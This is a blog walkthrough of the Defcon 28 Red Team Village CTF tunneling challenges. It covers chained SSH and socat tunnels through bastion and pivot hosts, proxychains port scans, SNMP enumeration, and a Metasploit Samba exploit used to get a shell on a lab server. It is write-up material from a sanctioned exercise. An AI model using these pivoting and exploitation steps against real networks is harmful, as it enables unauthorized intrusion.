---
layout: post
title:  "Defcon 28: Red Team Village CTF"
date:   2020-08-25 00:00:00 -0400
categories: master
---

This year's Defcon was my first time attending Defcon (virtually, of course). I heard that the Red Team CTF was pretty good, so I tried my hand at it. I got in 190th place by the end of day 3. Not bad for solo casual, especially considering the top handful of teams had at least a dozen members.

I got through all of the exercises under the "trainer" category as a warmup. Not too hard. I found the exercises under "tunneler" to be a lot more interesting. I messed with SSH tunnels back in my OSCP days, but haven't really touched it since. So I found these sets of challenges to be valuable, since they built on top of each other and got progressively more challenging. Tunnels within tunnels!

Below is my wakthrough for all the tunneler exercises, with some misc. notes at the bottom.

## Exercise 1: 1 Bastion
`Connect to the first bastion host`

ssh tunneler@164.90.147.41 -p 2222
```
Bastion Hosts are an amazing way to provide secure access from a public internet 
to a private subnet.

A secure deployment of a bastion host would only allow users to ssh in with a ssh 
private key. We already failed and left ours open with a password, you should 
never do that.

We also put our SSH server on port 2222, this doesn't offer any security.  It just 
cuts down on the amount of logging we get from people scanning our host with tools 
like shodan.

The first challenge is to forward a port or forward tunnel to view a web server on 
an internal network.  The address is 10.174.12.14 and it is listening on port 80.

The second challenge is to connect to the pivot host.  The address is 
10.218.176.199 with user: whistler and password: cocktailparty
```

## Exercise 2: 2 Browsing Websites
Browse to http://10.174.12.14/

`ssh -L 8080:10.174.12.14:80 tunneler@164.90.147.41 -p 2222`

Then with browser, browse to 127.0.0.1:8080

![first-tunnel](https://i.imgur.com/aMvABcF.png)

## Exercise 3: 3 SSH in tunnels
`SSH through the bastion to the pivot.`

Establish the following tunnel: 

`ssh -L 8080:10.218.176.199:22 tunneler@164.90.147.41 -p 2222`

Connect to the pivot: `ssh whistler@127.0.0.1 -p 8080`

```
Pivot-1:

Some things you can do:

Something is Beaconing to the pivot on port 58671-58680 to ip 10.112.3.199, can you 
tunnel it back?

scan for the ftp server: 10.112.3.207 user: bishop pass: geese  (Its not where you think 
it is, also the banner is important)

connect to pivot-2 ip: 10.112.3.12 ssh port: 22 user: crease pass: NoThatsaV

connect to ip: 10.112.3.88 port: 7000, a beacon awaits you
```

## Exercise 4: 4 Beacons everywhere
`Something is Beaconing to the pivot on port 58671-58680 to ip 10.112.3.199, can you tunnel it back?`

Time to create a reverse tunnel! setup nc listener `nc -l 8082`

And then create reverse tunnels to each port until something hits your port 8082

`ssh -R 10.112.3.199:58672:127.0.0.1:8082 whistler@127.0.0.1 -p 8080 -N`


## Exercise 5: 5 Beacons annoying
`Connect to ip: 10.112.3.88 port: 7000, a beacon awaits you`

Create a tunnnel to the ip: 

`ssh -L 8081:10.112.3.88:7000 whistler@127.0.0.1 -p 8080`

Then, `nc 127.0.0.1 8081` to receive instructions

```
I will send the flag to ip: 10.112.3.199 on port: 23269 in 15 seconds

the flag was sent, I hope you got it!
```

Now, quickly establish a /remote/ forward tunnel:

`ssh -R 10.112.3.199:23269:127.0.0.1:8082 whistler@127.0.0.1 -p 8080 -N`

- N flag -> no exection; optional -f flag -> run in background

And quickly set up a local ncat listener `nc -l 8082`

Then you'll get the flag if you're fast enough


## Exercise 6: Scan me

`We deployed a ftp server but we forgot which port, find it and connect`

setup dynamic port forwarding for proxychains 

`ssh -D 9050 whistler@127.0.0.1 -p 8080 -N`

`proxychains4 nmap -n -sT -p- 10.112.3.207`

output:
```
Nmap scan report for 10.112.3.207
Host is up (0.090s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
53121/tcp open  unknown
```

`proxychains4 ftp 10.112.3.207 53121`

## Exercise 7: 7 Another Pivot
`Connect to the second pivot`

ssh access to crease: `ssh -L 8081:10.112.3.12:22 whistler@127.0.0.1 -p 8080`

`ssh crease@127.0.0.1 -p 8081`

This pivot did not allow for TCPForwarding, which is an openssh option usually found in `/etc/ssh/sshd_config`

```
# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
```

```
Pivot-2:

Not all SSH servers allow tunnels, so you have to get creative sometimes.

Socat is here if you need it.

There is a samba server at 10.24.13.10, find a flag sitting in /
```

## Exercise 8: 8 snmp

tunneling udp over tcp; figuring out the right socat flags took forever

ssh access to crease: 
`ssh -L 8081:10.112.3.12:22 whistler@127.0.0.1 -p 8080`

`ssh crease@127.0.0.1 -p 8081`

creating tcp tunnel to tunnel udp: `ssh -L 8082:10.112.3.12:8080 whistler@127.0.0.1 -p 8080 -N`

on crease: `socat TCP4-LISTEN:8080,fork,reuseaddr UDP4:10.24.13.161:161`

on my laptop: `socat UDP-recvfrom:161,fork TCP4:localhost:8082`

UDP-LISTEN did not give a stable connection; the first connection would passthrough, but would return 'connection refused' for more complex commands like nmap.

```
$ sudo nmap 127.0.0.1 -Pn -sU -p 161 -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-07 20:21 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.17s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: snmpd-1
```

`snmpwalk -v1 -c public 127.0.0.1`

The output from snmpwalk gives us the flag:

```
SNMPv2-MIB::sysDescr.0 = STRING: Linux 446f274a9fc1 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (11819245) 1 day, 8:49:52.45
SNMPv2-MIB::sysContact.0 = STRING: ts{UDPthroughTCPtunnels}
SNMPv2-MIB::sysName.0 = STRING: snmpd-1
```

## Exercise 9: 9 Samba
`There is a samba server at 10.24.13.10, find a flag sitting in the root file system /`

This one took me longer than it should have for what it was
- through testing w/ socat, tcp&udp port 137 and udp port 139 was closed, which is why I suspect that a lot of the smb enumeration tools were failing (ie smbmap)
- version of samba is 4.6.3
- had to bust out metasplot for this; creating a symlink to the rootfs didnt work (probably didnt have admin privs required), but linux/samba/is_known_pipeline worked beautifully

`ssh -L 8010:10.112.3.12:8080 whistler@127.0.0.1 -p 8080`

on crease: `socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.24.13.10:139`

msf: `linux/samba/is_known_pipeline` 

- rhosts->127.0.0.1
- rport->8010 
- smb_share_name->myshare
- smb_folder->blook (name is arbitrary for smb_folder)

Then in metasploit, after successful exploit and a conection is made: 

`shell`, `cd /;ls` `cat flag.txt`

didnt need it but can list shares via `smbclient -N -L \\\\127.0.0.1\ -p 8010`

- trying to specify port via 127.0.0.1:8010 threw me off for so long
- -N flag is for anon. loging; -L for list
- `smbclient -N \\\\127.0.0.1\myshare -p 8010` to access a file share
- to mount: `mount -t cifs //127.0.0.1/myshare /mnt/samba/ -o port=8010 -o guest`
	- if get 'bad option' error, need to install cifs-utils, nfs-common
	- this still wont allow for root filesystem to be mounted; only 1 share at a time
	- /mnt/samba is the directory on your local disk to mount to

## Exercise 10: 10 Browsing websites 2
Browse to http://2a02:6b8:b010:9010:1::86/
After going through exercise 8 and 9, this one was a breeze

Crease was the only machine that had ping6, so I started there

On crease, the ipv6 host was reachable:

```
$ ping6 2a02:6b8:b010:9010:1::86
PING 2a02:6b8:b010:9010:1::86(2a02:6b8:b010:9010:1::86) 56 data bytes
64 bytes from 2a02:6b8:b010:9010:1::86: icmp_seq=1 ttl=64 time=0.036 ms
```

creating ssh tunnel from whistler to crease: `ssh -L 8010:10.112.3.12:8081 whistler@127.0.0.1 -p 8080`
establishing the socat tunnel on crease: `socat TCP4-LISTEN:8081,reuseaddr,fork TCP6:[2a02:6b8:b010:9010:1::86]:80`
on local machine:
```
~$ curl 127.0.0.1:8010
<html>
    <head>

    </head>
    <body>
        <h2>Your First IPv6 Tunnel!</h2>
        <p>You made your first IPv6 tunnel, take this flag as a reward for your hard work ts{IPv6isNotActuallyNew}</p>
    </body>
</html>
```


## Misc
- tunnels! forward vs reverse ssh tunels, dynamic tunnels, socat, proxychains
	- [https://linuxize.com/post/how-to-setup-ssh-tunneling/](https://linuxize.com/post/how-to-setup-ssh-tunneling/)

- can export objects like http (zip file) from wireshark, but need to delete the first ~150 of bytes that are the http header, and the last line, which are not part of the zip file itself--> pkcrack (if dont remove lines, it will fail saying that the file is not a 2.x zip file)

- cant create ssh tunnels if tcp forwarding is turned off, but socat will come to the rescue
	- in `/etc/ssh/sshd_config` `AllowTcpFowarding No`

- I thought I knew my way around classical ciphers, but this is the first time I've heard of Baconian Cipher.
http://rumkin.com/tools/cipher/baconian.php

- Fail2ban - heard about this, but never looked into what it did exactly; it will temporary ban an ip address after x many failed login attempts (and log it)

